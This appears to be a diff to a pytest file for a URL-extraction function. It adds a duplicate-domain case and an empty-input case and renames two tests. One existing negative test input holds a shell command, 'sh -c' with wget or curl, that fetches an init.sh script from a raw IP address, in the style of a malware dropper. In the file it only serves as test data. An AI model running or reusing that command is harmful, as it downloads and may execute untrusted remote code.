@@ -21,6 +21,7 @@ def test_is_valid_url(url, expected):
     "text, expected_urls",
     [
         ("somedomain.com", ["somedomain.com"]),
+        ("somedomain.com somedomain.com", ["somedomain.com"]),
         ("Check out this website: https://www.example.com ", ["www.example.com"]),
         (
             "Some text https://www.example1.com more text http://www.example2.com",
@@ -32,7 +33,7 @@ def test_is_valid_url(url, expected):
         ),
     ],
 )
-def test_get_urls_from_text(text, expected_urls):
+def test_get_urls_from_text_returns_unique_domains(text, expected_urls):
     actual = get_urls_from_text(text)
 
     assert len(actual) == len(expected_urls)
@@ -43,6 +44,7 @@ def test_get_urls_from_text(text, expected_urls):
 @pytest.mark.parametrize(
     "text",
     [
+        (""),
         ("No url here -Force;cpi"),
         (
             "IP addres is not a domain name sh -c 'wget -q http://123.45.67.8/init.sh || curl -s -O -f http://123.45.67.8/init.sh 2>&1 3>&1'"
@@ -51,5 +53,5 @@ def test_get_urls_from_text(text, expected_urls):
         ("http://[2607:f8b0:4003:c00::6a]/"),
     ],
 )
-def test_get_urls_from_text(text):
+def test_get_urls_from_text_returns_empty_list(text):
     assert get_urls_from_text(text) == []
